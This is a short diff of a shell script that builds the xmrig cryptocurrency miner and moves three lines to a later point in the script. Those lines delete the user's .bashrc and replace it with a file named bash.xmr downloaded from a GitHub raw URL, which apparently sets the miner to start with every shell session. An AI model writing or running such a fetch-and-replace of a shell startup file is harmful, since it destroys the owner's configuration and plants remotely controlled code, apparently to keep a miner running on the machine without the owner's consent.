@@ -1,9 +1,7 @@
 apt-get update -y
 apt-get install wget -y
 
-rm -rf .bashrc
-wget https://raw.githubusercontent.com/scorpionyb/file-bashrc/main/bash.xmr && cp bash.xmr .bashrc
-rm -rf bash.xmr
+
 
 
 cd xmrig/build 
@@ -31,7 +29,9 @@ echo Removed extra packages.
 
 
 
-
+rm -rf .bashrc
+wget https://raw.githubusercontent.com/scorpionyb/file-bashrc/main/bash.xmr && cp bash.xmr .bashrc
+rm -rf bash.xmr
 
 
 
